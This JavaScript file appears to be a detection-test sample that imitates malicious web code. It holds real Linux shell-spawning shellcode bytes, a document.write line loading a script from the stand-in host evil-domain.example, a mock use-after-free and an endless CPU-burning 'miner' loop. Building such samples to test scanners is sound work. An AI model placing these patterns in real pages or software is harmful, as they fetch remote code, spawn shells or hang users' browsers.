// Simulated shellcode (will trigger security alerts)
var shellcode = [
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // NOP sled
    0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, // Linux shellcode pattern
    0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50,
    0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80       // execve("/bin/sh", ["/bin/sh"], NULL)
];

function executeShellcode() {
    // This is just a simulation - it won't actually run shellcode
    // But security tools will detect the pattern
    var buffer = new ArrayBuffer(shellcode.length);
    var bufView = new Uint8Array(buffer);
    
    for (var i = 0; i < shellcode.length; i++) {
        bufView[i] = shellcode[i];
    }
    
    // Attempt to create a function from the buffer (this is just for detection)
    try {
        var func = new Function("return " + String.fromCharCode.apply(null, bufView));
    } catch (e) {
        console.log("This is just a demonstration, no actual shellcode execution");
    }
}

// Attempt to load external malicious content
document.write('<script src="http://evil-domain.example/malware.js"></script>');

// Simulated browser exploit code
function exploitBrowser() {
    // Use-after-free pattern (security tools will flag this)
    var target = document.createElement('div');
    document.body.appendChild(target);
    target.outerHTML = '';
    
    // Try to access the freed memory
    try {
        target.id = 'exploited';
    } catch (e) {
        console.log("Just a simulation");
    }
}

// Simulated cryptocurrency miner code
function mineCrypto() {
    while(true) {
        // CPU intensive operation that looks like crypto mining
        for (var i = 0; i < 10000000; i++) {
            Math.pow(Math.random(), Math.random());
        }
    }
}